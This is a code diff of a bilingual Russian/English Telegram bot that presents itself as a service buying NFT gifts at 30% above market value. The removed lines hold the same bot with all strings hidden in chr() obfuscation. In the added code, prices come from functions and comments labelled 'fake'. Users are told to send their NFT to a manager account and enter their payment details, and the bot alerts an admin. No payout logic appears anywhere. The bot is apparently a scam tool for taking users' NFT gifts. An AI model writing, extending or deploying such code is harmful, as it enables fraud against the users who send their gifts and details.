-chr(84)+chr(82)+chr(67)+chr(50)+chr(48)+chr(32)+chr(40)+chr(85)+chr(83)+chr(68)+chr(84)+chr(41): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
-chr(84)+chr(111)+chr(110)+chr(107)+chr(101)+chr(101)+chr(112)+chr(101)+chr(114)+chr(32)+chr(40)+chr(84)+chr(79)+chr(78)+chr(41): {chr(115)+chr(121)+chr(109): chr(84)+chr(79)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 0.18},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(107)+chr(114)+chr(97)+chr(105)+chr(110)+chr(101): {chr(115)+chr(121)+chr(109): chr(85)+chr(65)+chr(72), chr(114)+chr(97)+chr(116)+chr(101): 40.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(82)+chr(117)+chr(115)+chr(115)+chr(105)+chr(97): {chr(115)+chr(121)+chr(109): chr(82)+chr(85)+chr(66), chr(114)+chr(97)+chr(116)+chr(101): 92.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(83)+chr(65): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(66)+chr(101)+chr(108)+chr(97)+chr(114)+chr(117)+chr(115): {chr(115)+chr(121)+chr(109): chr(66)+chr(89)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 3.3},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(75)+chr(97)+chr(122)+chr(97)+chr(107)+chr(104)+chr(115)+chr(116)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(75)+chr(90)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 460.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(122)+chr(98)+chr(101)+chr(107)+chr(105)+chr(115)+chr(116)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(85)+chr(90)+chr(83), chr(114)+chr(97)+chr(116)+chr(101): 12600.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(84)+chr(117)+chr(114)+chr(107)+chr(101)+chr(121): {chr(115)+chr(121)+chr(109): chr(84)+chr(82)+chr(89), chr(114)+chr(97)+chr(116)+chr(101): 32.0},
-chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(65)+chr(122)+chr(101)+chr(114)+chr(98)+chr(97)+chr(105)+chr(106)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(65)+chr(90)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 1.7},
-}
-
-def gl(ctx): return ctx.user_data.get(chr(108)+chr(97)+chr(110)+chr(103), chr(114)+chr(117))
-def t(ctx, k): return TEXTS[gl(ctx)][k]
-
-def main_kb(ctx):
-tx = TEXTS[gl(ctx)]
-return InlineKeyboardMarkup([
-[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108)], callback_data=chr(115)+chr(101)+chr(108)+chr(108))],
-[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119)], callback_data=chr(104)+chr(111)+chr(119))],
-[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)], callback_data=chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116))],
-])
-
-def cur_kb():
-return InlineKeyboardMarkup([
-[InlineKeyboardButton(n, callback_data=chr(99)+chr(117)+chr(114)+chr(95)+n)]
-for n in CURRENCIES
-])
-
-def fake_price(): return round(**import**(chr(114)+chr(97)+chr(110)+chr(100)+chr(111)+chr(109)).uniform(15, 120), 2)
-
-async def start(u, ctx):
-kb = InlineKeyboardMarkup([[
-InlineKeyboardButton(chr(1056)+chr(1091)+chr(1089)+chr(1089)+chr(1082)+chr(1080)+chr(1081), callback_data=chr(108)+chr(97)+chr(110)+chr(103)+chr(95)+chr(114)+chr(117)),
-InlineKeyboardButton(chr(69)+chr(110)+chr(103)+chr(108)+chr(105)+chr(115)+chr(104), callback_data=chr(108)+chr(97)+chr(110)+chr(103)+chr(95)+chr(101)+chr(110))
-]])
-await u.message.reply_text(chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1103)+chr(1079)+chr(1099)+chr(1082)+chr(32)+chr(47)+chr(32)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(108)+chr(97)+chr(110)+chr(103)+chr(117)+chr(97)+chr(103)+chr(101)+chr(58), reply_markup=kb)
-return LANG
-
-async def lang_cb(u, ctx):
-q = u.callback_query
-await q.answer()
-ctx.user_data[chr(108)+chr(97)+chr(110)+chr(103)] = q.data.split(chr(95))[1]
-await q.edit_message_text(t(ctx, chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
-return MAIN_MENU
-
-async def menu_cb(u, ctx):
-q = u.callback_query
-await q.answer()
-d = q.data
-back = InlineKeyboardMarkup([[InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107)), callback_data=chr(98)+chr(97)+chr(99)+chr(107))]])
-if d == chr(115)+chr(101)+chr(108)+chr(108):
-await q.edit_message_text(t(ctx, chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110))
-return SELL_NFT_LINK
-elif d == chr(104)+chr(111)+chr(119):
-await q.edit_message_text(t(ctx, chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=back)
-elif d == chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116):
-await q.edit_message_text(t(ctx, chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=back)
-elif d == chr(98)+chr(97)+chr(99)+chr(107):
-await q.edit_message_text(t(ctx, chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
-return MAIN_MENU
-
-async def recv_link(u, ctx):
-txt = u.message.text.strip()
-if chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47) not in txt:
-await u.message.reply_text(t(ctx, chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)))
-return SELL_NFT_LINK
-ctx.user_data[chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)] = txt
-ctx.user_data[chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)] = fake_price()
-await u.message.reply_text(t(ctx, chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)), reply_markup=cur_kb())
-return SELL_CURRENCY
-
-async def cur_cb(u, ctx):
-q = u.callback_query
-await q.answer()
-name = q.data[4:]
-cur = CURRENCIES[name]
-market = round(ctx.user_data[chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)] * cur[chr(114)+chr(97)+chr(116)+chr(101)], 2)
-offer = round(market * 1.3, 2)
-ctx.user_data.update({chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): name, chr(111)+chr(102)+chr(102)+chr(101)+chr(114): offer, chr(115)+chr(121)+chr(109): cur[chr(115)+chr(121)+chr(109)]})
-msg = t(ctx, chr(111)+chr(102)+chr(102)+chr(101)+chr(114)).format(link=ctx.user_data[chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)], market=market, offer=offer, sym=cur[chr(115)+chr(121)+chr(109)])
-kb = InlineKeyboardMarkup([[
-InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115)), callback_data=chr(121)+chr(101)+chr(115)),
-InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111)), callback_data=chr(110)+chr(111)),
-]])
-await q.edit_message_text(msg, parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=kb)
-return SELL_CONFIRM
-
-async def confirm_cb(u, ctx):
-q = u.callback_query
-await q.answer()
-if q.data == chr(110)+chr(111):
-await q.edit_message_text(t(ctx, chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100)), reply_markup=main_kb(ctx))
-return MAIN_MENU
-await q.edit_message_text(t(ctx, chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115)).format(currency=ctx.user_data.get(chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121), )), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110))
-return SELL_REQUISITES
-
-async def recv_req(u, ctx):
-req = u.message.text.strip()
-msg = t(ctx, chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100)).format(
-link=ctx.user_data.get(chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107), ),
-offer=ctx.user_data.get(chr(111)+chr(102)+chr(102)+chr(101)+chr(114), ),
-sym=ctx.user_data.get(chr(115)+chr(121)+chr(109), ),
-req=req
-)
-await u.message.reply_text(msg, parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
-try:
-adm = (chr(1053)+chr(1086)+chr(1074)+chr(1072)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(33)+chr(92)+chr(110)+chr(85)+chr(115)+chr(101)+chr(114)+chr(58)+chr(32) + str(u.effective_user.username or u.effective_user.id)
-+ chr(92)+chr(110)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32) + ctx.user_data.get(chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107), )
-+ chr(92)+chr(110)+chr(1057)+chr(1091)+chr(1084)+chr(1084)+chr(1072)+chr(58)+chr(32) + str(ctx.user_data.get(chr(111)+chr(102)+chr(102)+chr(101)+chr(114), ))
-+ chr(32) + ctx.user_data.get(chr(115)+chr(121)+chr(109), )
-+ chr(92)+chr(110)+chr(1042)+chr(1072)+chr(1083)+chr(1102)+chr(1090)+chr(1072)+chr(58)+chr(32) + ctx.user_data.get(chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121), )
-+ chr(92)+chr(110)+chr(1056)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(58)+chr(32) + req)
-await u.get_bot().send_message(ADMIN_ID, adm)
-except Exception as e:
-logger.error(str(e))
-return MAIN_MENU
-
-async def admin_cmd(u, ctx):
-if u.effective_user.id != ADMIN_ID:
-await u.message.reply_text(chr(1053)+chr(1077)+chr(1090)+chr(32)+chr(1076)+chr(1086)+chr(1089)+chr(1090)+chr(1091)+chr(1087)+chr(1072))
-return
-kb = InlineKeyboardMarkup([
-[InlineKeyboardButton(chr(1057)+chr(1090)+chr(1072)+chr(1090)+chr(1080)+chr(1089)+chr(1090)+chr(1080)+chr(1082)+chr(1072), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(115)+chr(116)+chr(97)+chr(116)+chr(115))],
-[InlineKeyboardButton(chr(1056)+chr(1072)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(98)+chr(114)+chr(111)+chr(97)+chr(100)+chr(99)+chr(97)+chr(115)+chr(116))],
-[InlineKeyboardButton(chr(1055)+chr(1086)+chr(1083)+chr(1100)+chr(1079)+chr(1086)+chr(1074)+chr(1072)+chr(1090)+chr(1077)+chr(1083)+chr(1080), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(117)+chr(115)+chr(101)+chr(114)+chr(115))],
-])
-await u.message.reply_photo(
-photo=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(105)+chr(46)+chr(105)+chr(109)+chr(103)+chr(117)+chr(114)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(52)+chr(77)+chr(51)+chr(52)+chr(104)+chr(105)+chr(50)+chr(46)+chr(112)+chr(110)+chr(103),
-caption=chr(1055)+chr(1072)+chr(1085)+chr(1077)+chr(1083)+chr(1100)+chr(32)+chr(1072)+chr(1076)+chr(1084)+chr(1080)+chr(1085)+chr(1080)+chr(1089)+chr(1090)+chr(1088)+chr(1072)+chr(1090)+chr(1086)+chr(1088)+chr(1072)+chr(92)+chr(110)+chr(92)+chr(110)+chr(1041)+chr(1086)+chr(1090)+chr(58)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(65)+chr(117)+chr(116)+chr(111)+chr(32)+chr(66)+chr(117)+chr(121)+chr(111)+chr(117)+chr(116)+chr(92)+chr(110)+chr(1052)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110),
-parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110),
-reply_markup=kb
+WELCOME_RU = (
+    "🎁 *Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram!*\n\n"
+    "Мы — профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n"
+    "Наш бот автоматически оценивает ваш NFT по характеристикам: модель, фон, узор — "
+    "и предлагает вам цену *на 30% выше рынка* 📈\n\n"
+    "Тысячи успешных сделок. Быстрые выплаты. Полная безопасность.\n\n"
+    "Выберите действие ниже 👇"
 )
 
-async def admin_cb(u, ctx):
-q = u.callback_query
-if u.effective_user.id != ADMIN_ID:
-await q.answer(chr(1053)+chr(1077)+chr(1090)+chr(32)+chr(1076)+chr(1086)+chr(1089)+chr(1090)+chr(1091)+chr(1087)+chr(1072), show_alert=True)
-return
-await q.answer()
-if q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(115)+chr(116)+chr(97)+chr(116)+chr(115):
-await q.message.reply_text(chr(1057)+chr(1090)+chr(1072)+chr(1090)+chr(1080)+chr(1089)+chr(1090)+chr(1080)+chr(1082)+chr(1072)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))
-elif q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(98)+chr(114)+chr(111)+chr(97)+chr(100)+chr(99)+chr(97)+chr(115)+chr(116):
-await q.message.reply_text(chr(1056)+chr(1072)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))
-elif q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(117)+chr(115)+chr(101)+chr(114)+chr(115):
-await q.message.reply_text(chr(1055)+chr(1086)+chr(1083)+chr(1100)+chr(1079)+chr(1086)+chr(1074)+chr(1072)+chr(1090)+chr(1077)+chr(1083)+chr(1080)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))
+WELCOME_EN = (
+    "🎁 *Welcome to the Automatic NFT Gift Buyout service in Telegram!*\n\n"
+    "We are a professional service that purchases NFT gifts above market value.\n"
+    "Our bot automatically evaluates your NFT by characteristics: model, background, pattern — "
+    "and offers you a price *30% above the market* 📈\n\n"
+    "Thousands of successful deals. Fast payouts. Full security.\n\n"
+    "Choose an action below 👇"
+)
+
+HOW_IT_WORKS_RU = (
+    "⚙️ *Как работает бот?*\n\n"
+    "1️⃣ Вы отправляете ссылку на NFT-подарок (например: `https://t.me/nft/PlushPepe-2133`)\n\n"
+    "2️⃣ Бот анализирует NFT: модель, фон, узор — и рассчитывает его рыночную стоимость\n\n"
+    "3️⃣ Вы выбираете способ получения оплаты:\n"
+    "   • CryptoBot\n   • TRC20\n   • Tonkeeper\n   • Карта (UA, RU, US, BY, KZ, UZ, TR, AZ)\n\n"
+    "4️⃣ Бот предлагает вам сумму на *30% выше рынка*\n\n"
+    "5️⃣ Если вы согласны — вы кидаете NFT менеджеру {manager}, он проверяет и переводит оплату\n\n"
+    "✅ Сделка завершена!"
+).format(manager=MANAGER_USERNAME)
+
+HOW_IT_WORKS_EN = (
+    "⚙️ *How does the bot work?*\n\n"
+    "1️⃣ You send a link to the NFT gift (e.g.: `https://t.me/nft/PlushPepe-2133`)\n\n"
+    "2️⃣ The bot analyzes the NFT: model, background, pattern — and calculates its market value\n\n"
+    "3️⃣ You choose the payment method:\n"
+    "   • CryptoBot\n   • TRC20\n   • Tonkeeper\n   • Card (UA, RU, US, BY, KZ, UZ, TR, AZ)\n\n"
+    "4️⃣ The bot offers you a price *30% above market*\n\n"
+    "5️⃣ If you agree — send the NFT to {manager}, they verify and send the payment\n\n"
+    "✅ Deal complete!"
+).format(manager=MANAGER_USERNAME)
+
+HOW_DEAL_RU = (
+    "🤝 *Как проводится сделка?*\n\n"
+    "1. Вы присылаете ссылку на NFT-подарок\n"
+    "2. Бот считает рыночную цену по параметрам: модель, фон, узор\n"
+    "3. Вы выбираете способ оплаты\n"
+    "4. Бот озвучивает свою сумму:\n\n"
+    "_Пример:_ Я предлагаю вам за ваш NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
+    "Если согласны — нажмите *Да*, если нет — *Нет*\n\n"
+    f"5. При согласии — отправьте NFT менеджеру {MANAGER_USERNAME}\n"
+    "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
+    "⚡ Среднее время сделки: 5–15 минут"
+)
+
+HOW_DEAL_EN = (
+    "🤝 *How is the deal conducted?*\n\n"
+    "1. You send the NFT gift link\n"
+    "2. The bot calculates market price by: model, background, pattern\n"
+    "3. You choose a payment method\n"
+    "4. The bot announces its offer:\n\n"
+    "_Example:_ I offer you for your NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
+    "If you agree — press *Yes*, if not — *No*\n\n"
+    f"5. If agreed — send the NFT to {MANAGER_USERNAME}\n"
+    "6. The manager verifies the gift and transfers payment to your details\n\n"
+    "⚡ Average deal time: 5–15 minutes"
+)
+
+SELL_ASK_LINK_RU = (
+    "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\n"
+    "Формат: `https://t.me/nft/НазваниеНФТ-Номер`\n\n"
+    "⚠️ Принимаются только NFT-подарки Telegram. Убедитесь что ссылка ведёт именно на NFT, а не на что-то другое."
+)
+
+SELL_ASK_LINK_EN = (
+    "🔗 *Send the link to your NFT gift*\n\n"
+    "Format: `https://t.me/nft/NFTName-Number`\n\n"
+    "⚠️ Only Telegram NFT gifts are accepted. Make sure the link leads to an NFT, not something else."
+)
+
+PAYMENT_METHODS_RU = [
+    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
+    "🇺🇦 Карта Украина", "🇷🇺 Карта Россия", "🇺🇸 Карта США",
+    "🇧🇾 Карта Беларусь", "🇰🇿 Карта Казахстан",
+    "🇺🇿 Карта Узбекистан", "🇹🇷 Карта Турция", "🇦🇿 Карта Азербайджан"
+]
+
+PAYMENT_METHODS_EN = [
+    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
+    "🇺🇦 Card Ukraine", "🇷🇺 Card Russia", "🇺🇸 Card USA",
+    "🇧🇾 Card Belarus", "🇰🇿 Card Kazakhstan",
+    "🇺🇿 Card Uzbekistan", "🇹🇷 Card Turkey", "🇦🇿 Card Azerbaijan"
+]
+
+# NFT name → fake base price range
+NFT_PRICES = {
+    "pepe": (80, 200), "plush": (60, 180), "dragon": (150, 400),
+    "cat": (50, 150), "bear": (70, 200), "dog": (60, 160),
+    "duck": (40, 120), "heart": (100, 300), "star": (90, 250),
+    "crystal": (200, 600), "diamond": (300, 800)
+}
+
+def estimate_price(nft_name: str) -> tuple:
+    name_lower = nft_name.lower()
+    for key, (lo, hi) in NFT_PRICES.items():
+        if key in name_lower:
+            base = random.randint(lo, hi)
+            our_price = round(base * 1.30, 2)
+            return base, our_price
+    base = random.randint(50, 300)
+    our_price = round(base * 1.30, 2)
+    return base, our_price
+
+def is_nft_link(text: str) -> bool:
+    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))
+
+def get_lang(context: ContextTypes.DEFAULT_TYPE) -> str:
+    return context.user_data.get("lang", "ru")
+
+# ==================== KEYBOARDS ====================
+
+def lang_keyboard():
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
+        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
+    ]])
+
+def main_menu_keyboard(lang):
+    if lang == "ru":
+        return InlineKeyboardMarkup([
+            [InlineKeyboardButton("💰 Продать NFT", callback_data="sell")],
+            [InlineKeyboardButton("⚙️ Как проводится сделка?", callback_data="how_deal")],
+            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")],
+        ])
+    else:
+        return InlineKeyboardMarkup([
+            [InlineKeyboardButton("💰 Sell NFT", callback_data="sell")],
+            [InlineKeyboardButton("⚙️ How is the deal conducted?", callback_data="how_deal")],
+            [InlineKeyboardButton("🆘 Support", callback_data="support")],
+        ])
+
+def payment_keyboard(lang):
+    methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
+    buttons = []
+    for i, method in enumerate(methods):
+        buttons.append([InlineKeyboardButton(method, callback_data=f"pay_{i}")])
+    buttons.append([InlineKeyboardButton(
+        "◀️ Назад" if lang == "ru" else "◀️ Back", callback_data="back_main"
+    )])
+    return InlineKeyboardMarkup(buttons)
+
+def confirm_keyboard(lang):
+    yes = "✅ Да, согласен" if lang == "ru" else "✅ Yes, I agree"
+    no = "❌ Нет" if lang == "ru" else "❌ No"
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(yes, callback_data="confirm_yes")],
+        [InlineKeyboardButton(no, callback_data="confirm_no")],
+    ])
+
+def back_keyboard(lang):
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("◀️ Главное меню" if lang == "ru" else "◀️ Main menu", callback_data="back_main")
+    ]])
+
+# ==================== ADMIN PANEL ====================
+
+def admin_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
+        [InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")],
+        [InlineKeyboardButton("🖼 Изменить баннер", callback_data="admin_banner")],
+        [InlineKeyboardButton("💬 Все сделки", callback_data="admin_deals")],
+        [InlineKeyboardButton("🚫 Заблокировать юзера", callback_data="admin_ban")],
+    ])
+
+# ==================== HANDLERS ====================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data.clear()
+    await update.message.reply_text(
+        "🌍 Выберите язык / Choose your language:",
+        reply_markup=lang_keyboard()
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    lang = get_lang(context)
+
+    # Language select
+    if data == "lang_ru":
+        context.user_data["lang"] = "ru"
+        await query.edit_message_text(
+            WELCOME_RU, parse_mode="Markdown",
+            reply_markup=main_menu_keyboard("ru")
+        )
+        return
+
+    if data == "lang_en":
+        context.user_data["lang"] = "en"
+        await query.edit_message_text(
+            WELCOME_EN, parse_mode="Markdown",
+            reply_markup=main_menu_keyboard("en")
+        )
+        return
+
+    # Main menu
+    if data == "back_main":
+        text = WELCOME_RU if lang == "ru" else WELCOME_EN
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(lang))
+        context.user_data.pop("state", None)
+        return
+
+    if data == "how_deal":
+        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        return
+
+    if data == "support":
+        text = (
+            f"🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к менеджеру: {SUPPORT_USERNAME}\n\n"
+            "Мы работаем 24/7 и ответим вам в течение нескольких минут!"
+            if lang == "ru" else
+            f"🆘 *Support*\n\nFor all questions, contact the manager: {SUPPORT_USERNAME}\n\n"
+            "We work 24/7 and will reply within minutes!"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        return
+
+    if data == "sell":
+        context.user_data["state"] = WAITING_NFT_LINK
+        text = SELL_ASK_LINK_RU if lang == "ru" else SELL_ASK_LINK_EN
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        return
+
+    # Payment method selected
+    if data.startswith("pay_"):
+        idx = int(data.split("_")[1])
+        methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
+        method = methods[idx]
+        context.user_data["payment"] = method
+        context.user_data["state"] = WAITING_REQUISITES
+
+        nft_link = context.user_data.get("nft_link", "https://t.me/nft/PlushPepe-2133")
+        our_price = context.user_data.get("our_price", 0)
+
+        text = (
+            f"💳 *Способ оплаты:* {method}\n\n"
+            f"📎 *Ваш NFT:* `{nft_link}`\n"
+            f"💵 *Наша цена:* ${our_price} USDT\n\n"
+            f"📝 Введите ваши реквизиты для получения оплаты:"
+            if lang == "ru" else
+            f"💳 *Payment method:* {method}\n\n"
+            f"📎 *Your NFT:* `{nft_link}`\n"
+            f"💵 *Our price:* ${our_price} USDT\n\n"
+            f"📝 Enter your payment details:"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        return
+
+    # Deal confirm/decline
+    if data == "confirm_yes":
+        nft_link = context.user_data.get("nft_link", "")
+        our_price = context.user_data.get("our_price", 0)
+        text = (
+            f"✅ *Отлично! Сделка принята.*\n\n"
+            f"Теперь вам нужно отправить ваш NFT менеджеру {MANAGER_USERNAME}\n\n"
+            f"📎 NFT: `{nft_link}`\n"
+            f"💵 Сумма выплаты: *${our_price} USDT*\n\n"
+            f"После получения NFT менеджер переведёт вам оплату в течение 5–15 минут.\n\n"
+            f"⚠️ Важно: передавайте NFT ТОЛЬКО через {MANAGER_USERNAME}. Мы не несём ответственности за сделки вне официального канала."
+            if lang == "ru" else
+            f"✅ *Great! Deal accepted.*\n\n"
+            f"Now you need to send your NFT to the manager {MANAGER_USERNAME}\n\n"
+            f"📎 NFT: `{nft_link}`\n"
+            f"💵 Payout amount: *${our_price} USDT*\n\n"
+            f"After receiving the NFT, the manager will transfer payment within 5–15 minutes.\n\n"
+            f"⚠️ Important: transfer the NFT ONLY via {MANAGER_USERNAME}. We are not responsible for deals outside the official channel."
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        context.user_data["state"] = None
+
+        # Notify admin
+        user = query.from_user
+        admin_text = (
+            f"🔔 *Новая сделка!*\n"
+            f"👤 Пользователь: @{user.username or user.id} ({user.id})\n"
+            f"📎 NFT: {nft_link}\n"
+            f"💵 Сумма: ${our_price}\n"
+            f"💳 Метод: {context.user_data.get('payment', '—')}"
+        )
+        try:
+            await context.bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
+        except:
+            pass
+        return
+
+    if data == "confirm_no":
+        text = (
+            "❌ Вы отказались от сделки. Если передумаете — мы всегда готовы!\n\n"
+            "Возвращайтесь в главное меню 👇"
+            if lang == "ru" else
+            "❌ You declined the deal. If you change your mind — we're always ready!\n\n"
+            "Return to the main menu 👇"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
+        context.user_data["state"] = None
+        return
+
+    # ==================== ADMIN PANEL ====================
+    if data == "admin_stats":
+        await query.edit_message_text(
+            "📊 *Статистика бота*\n\n"
+            "👥 Пользователей: —\n"
+            "💰 Сделок: —\n"
+            "📈 Объём выплат: —\n\n"
+            "_Подключите базу данных для реальной статистики_",
